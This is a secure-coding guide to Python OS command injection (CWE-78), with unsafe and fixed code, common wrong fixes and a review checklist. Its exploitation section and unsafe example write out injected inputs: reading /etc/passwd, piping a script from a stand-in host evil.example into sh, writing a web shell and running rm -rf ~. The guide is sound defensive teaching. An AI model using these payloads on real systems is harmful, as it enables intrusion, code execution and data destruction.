# CWE-78: OS Command Injection

## What it is

OS command injection (CWE-78) happens when a program builds a shell command from untrusted input and runs it through a shell. In Python the risky calls are `os.system`, `os.popen`, `subprocess.getoutput`, and `subprocess.run` / `call` / `Popen` / `check_output` with `shell=True`, especially when the command string is built with f-strings, `.format()`, `%` or `+`. The shell treats characters such as `;`, `&&`, `|`, `$(...)`, backticks, `>` and newlines as instructions, so a filename, hostname or branch name containing them makes the shell run extra commands. The fix for command injection is to stop involving the shell: run the program directly with a list of arguments, or use a Python library function that does the same job.

## How attackers exploit it

To exploit command injection, an attacker puts shell syntax into any value that ends up on the command line. If a network tool runs `os.system(f"ping -c 1 {host}")`, the input `8.8.8.8; cat /etc/passwd` runs a second command, and `$(curl evil.example/x.sh | sh)` downloads and runs a script. Redirection such as `> /var/www/html/shell.php` writes files. Putting the value inside quotes does not help, because input containing a matching quote breaks out. The injected commands run as the same user as the Python process, so the attacker can read secrets and source code, install a backdoor, move to other machines or delete data. Uploaded filenames, device names and form fields are common entry points.

## How to fix it in Python

To fix command injection, run the program without a shell:

- `subprocess.run(["ping", "-c", "1", host], check=False)`: a list of arguments and no `shell=True`. Each list item reaches the program as exactly one argument, so `;` or `$( )` are plain text.
- Replace `os.popen(cmd).read()` with `subprocess.run([...], capture_output=True, text=True).stdout`, and use `subprocess.check_output([...], text=True)` when a non-zero exit should raise.
- Replace shell features with Python: pipes with filtering in Python, `> file` with `stdout=f`, `< file` with `stdin=f`, globs with `glob.glob`, `~` with `os.path.expanduser`.
- Prefer a library call over any command: `shutil.copy`, `shutil.move`, `shutil.rmtree`, `os.makedirs`, `os.chmod`, `shutil.make_archive`, `tarfile`.
- Put `--` before user-supplied paths (for tools that support it) so a value starting with `-` is not read as an option.
- `shlex.quote` is a last resort, only when a shell is truly required.

## Unsafe example

This command injection example passes a user-supplied filename to the shell:

```python
import os

def count_lines(path: str) -> int:
    output = os.popen(f"wc -l < {path}").read()
    return int(output.strip())

# count_lines("notes.txt; rm -rf ~") also deletes the home directory
```

`os.popen` always runs its argument through `/bin/sh`, and the f-string puts `path` straight into that command line. A `;`, `|`, `&&` or `$(...)` in the filename starts new commands. The same problem applies to `os.system(cmd)` and `subprocess.run(cmd, shell=True)` whenever `cmd` contains outside data, even if part of it is quoted.

## Safe example

The command injection fix runs `wc` directly with an argument list and does the redirection in Python:

```python
import subprocess

def count_lines(path: str) -> int:
    with open(path, "rb") as f:
        result = subprocess.run(
            ["wc", "-l"], stdin=f, capture_output=True, text=True, check=True
        )
    return int(result.stdout.strip())
```

No shell is started, so special characters in `path` cannot run commands; a bad path simply raises `FileNotFoundError`. The function name, parameter and return type are unchanged. When the job is a simple file operation (copy, move, delete, make a folder), replace the command entirely with `shutil` or `os` functions instead of calling an external program.

## Common wrong fixes

These changes look like command injection fixes but stay unsafe or break the code:

- Blacklisting characters such as `;`, `&` or `|`. Shells also accept newlines, `$( )`, backticks and other tricks.
- Adding quotes around the value inside the string (`f"cat '{name}'"`). Input containing `'` closes them.
- Keeping `shell=True` but passing a list. On POSIX only the first item becomes the command, so the call silently breaks.
- Keeping `shell=True` and adding `shlex.quote` when the program could simply be run with a list.
- Building the list with `cmd_string.split()`; filenames with spaces break and the input is still mixed with the command.
- Replacing `os.system` with `os.popen` or `subprocess.getoutput`, which also use a shell.
- Adding `# nosec`, wrapping the call in try/except, or deleting the feature.

## Checklist for a correct fix

Before accepting an OS command injection fix, confirm:

- No `os.system`, `os.popen`, `subprocess.getoutput` or `shell=True` is left in the function.
- The command is a list such as `["tar", "-czf", out, src]`, with each user value as its own item and no string building.
- Shell features (pipes, redirects, globs, `&&`) are replaced with Python code.
- Where possible, `--` separates options from user-supplied paths, or values are checked so they cannot start with `-`.
- A stdlib function (`shutil`, `os`, `tarfile`) replaces the command when it does the same job.
- The function keeps its name, parameters, return value and normal behaviour, including how exit codes and output are handled.
- `import subprocess` (or `shutil`) is added if needed; no third-party packages and no `# nosec`.
